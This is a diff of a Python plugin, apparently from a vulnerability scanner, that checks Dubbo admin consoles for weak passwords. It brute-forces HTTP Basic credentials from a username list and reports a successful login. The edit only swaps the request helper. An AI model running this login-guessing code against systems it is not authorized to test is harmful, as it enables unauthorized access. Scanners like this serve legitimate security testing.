@@ -7,8 +7,7 @@ description: Dubbo 弱口令漏洞
 
 import base64
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
 
 class Dubbo_Weakpwd_BaseVerify:
     def __init__(self, url):
@@ -21,7 +20,7 @@ class Dubbo_Weakpwd_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            req = requests.get(self.url, headers = self.headers, verify = False)
+            req = request.get(self.url, headers = self.headers)
             if req.headers["www-authenticate"] == "Basic realm=\"dubbo\"":
                 for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                     user = user.strip()
@@ -32,7 +31,7 @@ class Dubbo_Weakpwd_BaseVerify:
                         verify_str = base64.b64encode(verify_str)
                         self.headers['Authorization'] = 'BASIC ' + verify_str
                         burp_req = requests.session()
-                        burp_resp = burp_req.get(url, headers = self.headers, verify = False)
+                        burp_resp = burp_req.get(url, headers = self.headers)
                         if 200 == burp_resp.status_code:
                             print('存在Dubbo弱口令漏洞')
                             return True
